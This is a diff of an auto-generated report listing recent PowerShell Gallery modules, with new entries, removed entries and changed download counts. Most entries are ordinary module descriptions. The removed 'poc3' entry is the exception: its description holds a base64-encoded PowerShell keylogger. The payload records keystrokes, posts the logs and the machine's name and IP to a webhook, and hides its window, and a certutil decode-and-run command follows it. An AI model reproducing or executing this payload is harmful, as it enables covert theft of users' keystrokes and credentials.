@@ -3,6 +3,123 @@
 
 These are the latest 250 modules published to the [PowerShell Gallery](https://powershellgallery.org). Azure and AWS modules published by Microsoft and Amazon have been __excluded__ from this report. The newest modules are listed first. Use `Import-Module` to install them or check the online repository for more information.
 
+## [PoshSophos](https://www.powershellgallery.com/Packages/PoshSophos/0.1) | 0.1
+
+### Published: 08/16/2023 00:41:17 by Zack Moss
+
+Module to work with the Sophos Central API
+
+__Downloads__: 0 | __Repository__: https://github.com/zackmoss/PoshSophos
+
+## [ADPFunctions](https://www.powershellgallery.com/Packages/ADPFunctions/2308.6) | 2308.6
+
+### Published: 08/15/2023 22:05:27 by Chris Darais
+
+ADP Functions
+
+__Downloads__: 136 | __Repository__: 
+
+## [SmtpClientDiag](https://www.powershellgallery.com/Packages/SmtpClientDiag/1.2.0.0) | 1.2.0.0
+
+### Published: 08/15/2023 21:26:36 by Richard Fajardo
+
+Smtp client diagnostic modules for troubleshoting SMTP client submission
+
+__Downloads__: 413 | __Repository__: https://github.com/richfaj/SmtpClientDiag
+
+## [CoreePower.Lib](https://www.powershellgallery.com/Packages/CoreePower.Lib/0.0.2.9) | 0.0.2.9
+
+### Published: 08/15/2023 21:14:38 by Carsten Riedel
+
+The "CoreePower.Lib" module is the a part of the CoreePower project.
+It adds command-line programs like 7-Zip, Git, GitHub CLI, NuGet, dotnet, and Visual Studio Code from the original sources.
+See full readme at https://github.com/carsten-riedel/CoreePower.Lib/#readme
+Note: the "Initialize-CorePowerLatest" command may conflict with existing installations. Use with caution.
+
+__Downloads__: 771 | __Repository__: https://github.com/carsten-riedel/CoreePower.Lib
+
+## [Office365-Scoutnet-synk](https://www.powershellgallery.com/Packages/Office365-Scoutnet-synk/2.0.4) | 2.0.4
+
+### Published: 08/15/2023 19:50:26 by Karl Thorén <karl.thoren@scouterna.se>
+
+Funktioner för att synkronisera Scoutnet med Office 365.
+
+__Downloads__: 331 | __Repository__: https://github.com/Scouterna/Office365-Scoutnet-synk
+
+## [DevolutionsGateway](https://www.powershellgallery.com/Packages/DevolutionsGateway/2023.2.3) | 2023.2.3
+
+### Published: 08/15/2023 19:19:27 by Devolutions
+
+Devolutions Gateway PowerShell Module
+
+__Downloads__: 1,110 | __Repository__: https://github.com/Devolutions/devolutions-gateway/tree/master/powershell/
+
+## [PSFeedHandler](https://www.powershellgallery.com/Packages/PSFeedHandler/0.0.1) | 0.0.1
+
+### Published: 08/15/2023 18:49:37 by Wojciech Napierala (voytas75)
+
+The ultimate solution for efficient management and exploration of Atom and RSS feeds.
+
+__Downloads__: 1 | __Repository__: https://github.com/voytas75/PSFeedHandler
+
+## [Orbit](https://www.powershellgallery.com/Packages/Orbit/0.9.2) | 0.9.2
+
+### Published: 08/15/2023 18:10:25 by David Eberhardt
+
+Scripts & Functions for Administrators working in the Microsoft 365 Orbit, Microsoft.Graph, MicrosoftTeams covering Resource Accounts, Call Queues, Auto Attendants, Licensing, User Voice Configuration and more.
+For more information, please visit https://github.com/DEberhardt/Orbit or https://davideberhardt.wordpress.com/
+
+__Downloads__: 59 | __Repository__: https://github.com/DEberhardt/Orbit
+
+## [Orbit.Authentication](https://www.powershellgallery.com/Packages/Orbit.Authentication/0.9.2) | 0.9.2
+
+### Published: 08/15/2023 18:10:08 by David Eberhardt
+
+Scripts & Functions for Administrators working in the Microsoft 365 Orbit
+
+__Downloads__: 81 | __Repository__: https://github.com/DEberhardt/Orbit
+
+## [Orbit.Groups](https://www.powershellgallery.com/Packages/Orbit.Groups/0.9.2) | 0.9.2
+
+### Published: 08/15/2023 18:10:04 by David Eberhardt
+
+Scripts & Functions for Administrators working in the Microsoft 365 Orbit
+
+__Downloads__: 82 | __Repository__: https://github.com/DEberhardt/Orbit
+
+## [Orbit.Teams](https://www.powershellgallery.com/Packages/Orbit.Teams/0.9.2) | 0.9.2
+
+### Published: 08/15/2023 18:10:00 by David Eberhardt
+
+Scripts & Functions for Administrators working in the Microsoft 365 Orbit
+
+__Downloads__: 91 | __Repository__: https://github.com/DEberhardt/Orbit
+
+## [Orbit.Tools](https://www.powershellgallery.com/Packages/Orbit.Tools/0.9.2) | 0.9.2
+
+### Published: 08/15/2023 18:09:56 by David Eberhardt
+
+Scripts & Functions for Administrators working in the Microsoft 365 Orbit
+
+__Downloads__: 88 | __Repository__: https://github.com/DEberhardt/Orbit
+
+## [Orbit.Users](https://www.powershellgallery.com/Packages/Orbit.Users/0.9.2) | 0.9.2
+
+### Published: 08/15/2023 18:09:52 by David Eberhardt
+
+Scripts & Functions for Administrators working in the Microsoft 365 Orbit
+
+__Downloads__: 91 | __Repository__: https://github.com/DEberhardt/Orbit
+
+## [TeamsFunctions](https://www.powershellgallery.com/Packages/TeamsFunctions/22.19.4) | 22.19.4
+
+### Published: 08/15/2023 17:48:58 by David Eberhardt
+
+Teams Functions for Administration of Users, Common Area Phones, Resource Accounts, Call Queues and Auto Attendants, incl. Licensing, User Voice Configuration with Calling Plans and Direct Routing,
+For more information, please visit the https://davideberhardt.wordpress.com/ or https://github.com/DEberhardt/TeamsFunctions
+
+__Downloads__: 4,476 | __Repository__: 
+
 ## [WinGet-Essentials](https://www.powershellgallery.com/Packages/WinGet-Essentials/1.1.0) | 1.1.0
 
 ### Published: 08/15/2023 17:36:08 by Jon Carrier
@@ -26,14 +143,6 @@ __Downloads__: 16,339 | __Repository__: https://github.com/GreyCorbel/AadAuthent
 Powershell Module to interact with the PowerProdect Data Manager (PPDM) API
 
 __Downloads__: 3,324 | __Repository__: https://github.com/bottkars/PPDM-pwsh
-
-## [ADPFunctions](https://www.powershellgallery.com/Packages/ADPFunctions/2308.4) | 2308.4
-
-### Published: 08/15/2023 16:57:13 by Chris Darais
-
-ADP Functions
-
-__Downloads__: 136 | __Repository__: 
 
 ## [OCI.PSModules](https://www.powershellgallery.com/Packages/OCI.PSModules/65.1.0) | 65.1.0
 
@@ -1406,7 +1515,7 @@ __Downloads__: 30,593 | __Repository__: https://github.com/microsoft/SdnDiagnost
 
 Mandatory module for the foundation PowerShell scripts.
 
-__Downloads__: 103 | __Repository__: 
+__Downloads__: 102 | __Repository__: 
 
 ## [UncommonSense.Parool](https://www.powershellgallery.com/Packages/UncommonSense.Parool/0.0.11) | 0.0.11
 
@@ -1423,17 +1532,6 @@ __Downloads__: 999 | __Repository__: https://github.com/jhoek/UncommonSense.Paro
 Common set of tools to interact with Symantec/Broadcom API for SEP Cloud
 
 __Downloads__: 39 | __Repository__: https://github.com/Douda/PSSymantecCloud
-
-## [CoreePower.Lib](https://www.powershellgallery.com/Packages/CoreePower.Lib/0.0.2.7) | 0.0.2.7
-
-### Published: 08/14/2023 05:50:36 by Carsten Riedel
-
-The "CoreePower.Lib" module is the a part of the CoreePower project.
-It adds command-line programs like 7-Zip, Git, GitHub CLI, NuGet, dotnet, and Visual Studio Code from the original sources.
-See full readme at https://github.com/carsten-riedel/CoreePower.Lib/#readme
-Note: the "Initialize-CorePowerLatest" command may conflict with existing installations. Use with caution.
-
-__Downloads__: 771 | __Repository__: https://github.com/carsten-riedel/CoreePower.Lib
 
 ## [victorykit.PSConfluencePublisher](https://www.powershellgallery.com/Packages/victorykit.PSConfluencePublisher/1.0.0) | 1.0.0
 
@@ -1585,7 +1683,7 @@ __Downloads__: 3,609 | __Repository__: https://www.github.com/alt3/Docusaurus.Po
 
 Get infomration about remote Windows logged in users, with the support of logging off a single user or all users from a single or multiple servers
 
-__Downloads__: 96,305 | __Repository__: https://github.com/farismalaeb/Powershell/tree/master/Get-ActiveSession
+__Downloads__: 95,934 | __Repository__: https://github.com/farismalaeb/Powershell/tree/master/Get-ActiveSession
 
 ## [ADEssentials](https://www.powershellgallery.com/Packages/ADEssentials/0.0.164) | 0.0.164
 
@@ -1593,7 +1691,7 @@ __Downloads__: 96,305 | __Repository__: https://github.com/farismalaeb/Powershel
 
 Helper module for Active Directory with lots of useful functions that simplify supporting Active Directory.
 
-__Downloads__: 151,570 | __Repository__: https://github.com/EvotecIT/ADEssentials
+__Downloads__: 151,571 | __Repository__: https://github.com/EvotecIT/ADEssentials
 
 ## [PSWriteHTML](https://www.powershellgallery.com/Packages/PSWriteHTML/1.2.0) | 1.2.0
 
@@ -1601,7 +1699,7 @@ __Downloads__: 151,570 | __Repository__: https://github.com/EvotecIT/ADEssential
 
 PSWriteHTML is PowerShell Module to generate beautiful HTML reports, pages, emails without any knowledge of HTML, CSS or JavaScript. To get started basics PowerShell knowledge is required.
 
-__Downloads__: 1,946,909 | __Repository__: https://github.com/EvotecIT/PSWriteHTML
+__Downloads__: 1,946,950 | __Repository__: https://github.com/EvotecIT/PSWriteHTML
 
 ## [TitanApi](https://www.powershellgallery.com/Packages/TitanApi/0.1.1) | 0.1.1
 
@@ -1635,7 +1733,7 @@ The non-official OpenAI PowerShell module. This module is used to interact with 
     - 2023-03-09    v1.0.4.9    Added change logs in the description.
     - 2023-03-08    v1.0.4.8    Added error handling.
 
-__Downloads__: 39,644 | __Repository__: https://github.com/chenxizhang/openai-powershell/
+__Downloads__: 39,518 | __Repository__: https://github.com/chenxizhang/openai-powershell/
 
 ## [SidCloner](https://www.powershellgallery.com/Packages/SidCloner/2.1.1) | 2.1.1
 
@@ -1759,7 +1857,7 @@ __Downloads__: 211 | __Repository__: https://github.com/johnduprey/BitwardenPS
 
 This module provides an interface to the Hudu Rest API further information can be found at https://github.com/lwhitelock/HuduAPI
 
-__Downloads__: 562,285 | __Repository__: 
+__Downloads__: 562,293 | __Repository__: 
 
 ## [Brownserve.PSTools](https://www.powershellgallery.com/Packages/Brownserve.PSTools/0.15.0) | 0.15.0
 
@@ -1849,7 +1947,7 @@ __Downloads__: 9,191 | __Repository__: https://www.cayosoft.com/cgraph
 
 Automation tools for production quality database deployment
 
-__Downloads__: 4,413,406 | __Repository__: https://www.red-gate.com/sca/productpage
+__Downloads__: 4,413,481 | __Repository__: https://www.red-gate.com/sca/productpage
 
 ## [VSTeam](https://www.powershellgallery.com/Packages/VSTeam/7.13.3) | 7.13.3
 
@@ -1857,7 +1955,7 @@ __Downloads__: 4,413,406 | __Repository__: https://www.red-gate.com/sca/productp
 
 Adds functionality for working with Azure DevOps and Team Foundation Server.
 
-__Downloads__: 1,594,881 | __Repository__: https://github.com/MethodsAndPractices/vsteam
+__Downloads__: 1,594,935 | __Repository__: https://github.com/MethodsAndPractices/vsteam
 
 ## [celin.ais.pwsh](https://www.powershellgallery.com/Packages/celin.ais.pwsh/1.0.6) | 1.0.6
 
@@ -1897,7 +1995,7 @@ __Downloads__: 120 | __Repository__: https://github.com/bepsoccer/verkadaModule
 
 Interact with GitLab via PowerShell
 
-__Downloads__: 13,475 | __Repository__: https://github.com/chris-peterson/pwsh-gitlab
+__Downloads__: 13,474 | __Repository__: https://github.com/chris-peterson/pwsh-gitlab
 
 ## [OSD](https://www.powershellgallery.com/Packages/OSD/23.8.8.1) | 23.8.8.1
 
@@ -1905,7 +2003,7 @@ __Downloads__: 13,475 | __Repository__: https://github.com/chris-peterson/pwsh-g
 
 Hot August Edition
 
-__Downloads__: 849,589 | __Repository__: https://github.com/OSDeploy/OSD
+__Downloads__: 849,632 | __Repository__: https://github.com/OSDeploy/OSD
 
 ## [PAF](https://www.powershellgallery.com/Packages/PAF/0.2.5) | 0.2.5
 
@@ -1987,102 +2085,4 @@ Create SHA password hash for use in Linux /etc/shadow file
 
 __Downloads__: 3 | __Repository__: https://github.com/thordreier/ShaCrypt
 
-## [FpsGeneral](https://www.powershellgallery.com/Packages/FpsGeneral/1.0.23220.1) | 1.0.23220.1
-
-### Published: 08/08/2023 10:01:32 by ekeukens
-
-This PS Module contains functions necessary to use 4PS general tasks
-
-__Downloads__: 4,684 | __Repository__: 
-
-## [AsBuiltReport.NetApp.ONTAP](https://www.powershellgallery.com/Packages/AsBuiltReport.NetApp.ONTAP/0.6.6) | 0.6.6
-
-### Published: 08/08/2023 04:11:56 by Jonathan Colon Feliciano
-
-A PowerShell module to generate an as built report on the configuration of NetApp ONTAP.
-
-__Downloads__: 1,445 | __Repository__: https://github.com/AsBuiltReport/AsBuiltReport.NetApp.ONTAP
-
-## [K8sShell](https://www.powershellgallery.com/Packages/K8sShell/1.0.4) | 1.0.4
-
-### Published: 08/08/2023 04:08:57 by mattf
-
-A PowerShell module that is intended to simplify and potentially help in automating day-to-day tasks typically performed using kubectl.exe.
-
-In particular, what is implemented within this module is primarily the "R" and "D" from CRUD: Read and Delete.
-
-__Downloads__: 14 | __Repository__: https://github.com/anongitmous/k8sShell/wiki
-
-## [hugoalh.GitHubActionsToolkit](https://www.powershellgallery.com/Packages/hugoalh.GitHubActionsToolkit/1.7.1) | 1.7.1
-
-### Published: 08/08/2023 02:15:09 by hugoalh
-
-Provide a better and easier way for GitHub Actions to communicate with the runner machine, and the toolkit for developing GitHub Actions in PowerShell.
-
-__Downloads__: 71,953 | __Repository__: https://github.com/hugoalh-studio/ghactions-toolkit-powershell
-
-## [Citrix.Workloads.Portability](https://www.powershellgallery.com/Packages/Citrix.Workloads.Portability/2.3.1) | 2.3.1
-
-### Published: 08/07/2023 23:08:01 by Citrix Image Portability Engineering
-
-Standalone Cmdlet for the Image Job of Citrix Image Portability Service
-
-__Downloads__: 784 | __Repository__: 
-
-## [TableUI](https://www.powershellgallery.com/Packages/TableUI/1.0.4) | 1.0.4
-
-### Published: 08/07/2023 22:14:11 by Jon Carrier
-
-A simple interface for making selections on an array of PS objects
-
-__Downloads__: 50 | __Repository__: https://github.com/jjcarrier/PS-TableUI
-
-## [LibSnitcher](https://www.powershellgallery.com/Packages/LibSnitcher/1.1.0) | 1.1.0
-
-### Published: 08/07/2023 22:02:33 by Francisco Nabas
-
-This module contains tools to manage module dependencies.
-
-__Downloads__: 14 | __Repository__: https://github.com/FranciscoNabas/LibSnitcher
-
-## [PSQuizMaster](https://www.powershellgallery.com/Packages/PSQuizMaster/1.0.0) | 1.0.0
-
-### Published: 08/07/2023 14:48:43 by Jeff Hicks
-
-A module for running and creating quizzes to learn PowerShell. Quizzes are stored as JSON files.
-
-__Downloads__: 9 | __Repository__: https://github.com/jdhitsolutions/PSQuizMaster
-
-## [KeDo_AZTableAPI](https://www.powershellgallery.com/Packages/KeDo_AZTableAPI/3.2.1) | 3.2.1
-
-### Published: 08/07/2023 12:46:34 by Ken Dobrunz
-
-AZ Table API commands
-
-__Downloads__: 312 | __Repository__: 
-
-## [Az.Avd](https://www.powershellgallery.com/Packages/Az.Avd/3.1.0) | 3.1.0
-
-### Published: 08/07/2023 11:55:00 by Sander Rozemuller
-
-For managing and automate Azure Virtual Desktop environments. This module can also be used for housekeeping and manageing all the AVD related Azure resources.
-
-__Downloads__: 7,600 | __Repository__: https://github.com/srozemuller/AzAvd
-
-## [TUN.CredentialManager](https://www.powershellgallery.com/Packages/TUN.CredentialManager/3.0.1) | 3.0.1
-
-### Published: 08/07/2023 07:28:57 by Dave Garnar and Markus Szumovski
-
-Provides access to credentials in the Windows Credential Manager (continuation of CredentialManager by Dave Garnar)
-
-__Downloads__: 11,590 | __Repository__: https://github.com/echalone/PowerShell_Credential_Manager
-
-## [poc3](https://www.powershellgallery.com/Packages/poc3/0.0.1) | 0.0.1
-
-### Published: 08/07/2023 05:57:40 by Jakoby
-
-1uZSAkZmlsZUNoZWNrKSAtYW5kICghKFtTdHJpbmddOjpJc051bGxPcldoaXRlU3BhY2UoKEdldC1jb250ZW50ICRsb2dGaWxlKSkpKSApDQogICAgICB7DQogICAgICAgICAgJGxvZ3MgPSBHZXQtQ29udGVudCAiJGxvZ0ZpbGUiIHwgT3V0LVN0cmluZw0KICAgICAgICAgICRCb2R5ID0gQHsNCiAgICAgICAgICAgICd1c2VybmFtZScgPSAiJGVudjpDb21wdXRlck5hbWUgKCRJUCkiDQogICAgICAgICAgICAnY29udGVudCcgPSAiYGAkbG9nc2BgIg0KICAgICAgICAgIH0NCiAgICAgICAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAoJEJvZHkpDQogICAgICAgICAgaWYgKFRlc3QtUGF0aCAkbG9nRmlsZSkgDQogICAgICAgICAgew0KICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAkbG9nRmlsZQ0KICAgICAgICAgICAgICAkZ2VuZXJhdGVMb2cgPSBOZXctSXRlbSAtUGF0aCAkbG9nRmlsZSAtSXRlbVR5cGUgRmlsZSAtRm9yY2UNCiAgICAgICAgICB9DQogICAgICB9DQogICAgICAkZmlsZUNoZWNrID0gJGZpbGVTaXplDQogICAgICAkY291bnRlciA9ICR0aW1lcg0KICAgICAgZm9yICgkYXNjaWkgPSA5OyAkYXNjaWkgLWxlIDI1NDsgJGFzY2lpKyspIHsNCiAgICAgICAgJGtleXN0YXRlID0gJEFQSTo6R2V0QXN5bmNLZXlTdGF0ZSgkYXNjaWkpDQogICAgICAgIGlmICgka2V5c3RhdGUgLWVxIC0zMjc2Nykgew0KICAgICAgICAgICRudWxsID0gW2NvbnNvbGVdOjpDYXBzTG9jaw0KICAgICAgICAgICRtYXBLZXkgPSAkQVBJOjpNYXBWaXJ0dWFsS2V5KCRhc2NpaSwgMykNCiAgICAgICAgICAka2V5Ym9hcmRTdGF0ZSA9IE5ldy1PYmplY3QgQnl0ZVtdIDI1Ng0KICAgICAgICAgICRoaWRlS2V5Ym9hcmRTdGF0ZSA9ICRBUEk6OkdldEtleWJvYXJkU3RhdGUoJGtleWJvYXJkU3RhdGUpDQogICAgICAgICAgJGxvZ2dlZGNoYXIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyDQogICAgICAgICAgaWYgKCRBUEk6OlRvVW5pY29kZSgkYXNjaWksICRtYXBLZXksICRrZXlib2FyZFN0YXRlLCAkbG9nZ2VkY2hhciwgJGxvZ2dlZGNoYXIuQ2FwYWNpdHksIDApKSB7DQogICAgICAgICAgICBbU3lzdGVtLklPLkZpbGVdOjpBcHBlbmRBbGxUZXh0KCRsb2dGaWxlLCAkbG9nZ2VkY2hhciwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZSkNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgIH0NCiAgICB9DQogIH0NCiAgZmluYWxseSB7DQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkd2ViaG9vayAtTWV0aG9kIFBvc3QgLUJvZHkgJGZpbk1zZw0KICAgIFJlbW92ZS1JdGVtICRsb2dGaWxlIC1mb3JjZSB8IG91dC1udWxsDQogIH0NCn0NCiRpID0gJ1tEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KGludCBoYW5kbGUsIGludCBzdGF0ZSk7JzthZGQtdHlwZSAtbmFtZSB3aW4gLW1lbWJlciAkaSAtbmFtZXNwYWNlIG5hdGl2ZTtbbmF0aXZlLndpbl06OlNob3dXaW5kb3coKFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc106OkdldEN1cnJlbnRQcm9jZXNzKCkgfCBHZXQtUHJvY2VzcykuTWFpbldpbmRvd0hhbmRsZSwgMCk7DQomIExvZ2dlcg== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
-
-__Downloads__: 3 | __Repository__: 
-
-*Updated: Tuesday, 15 August 2023 17:52:48 UTC*
+*Updated: Wednesday, 16 August 2023 02:01:13 UTC*
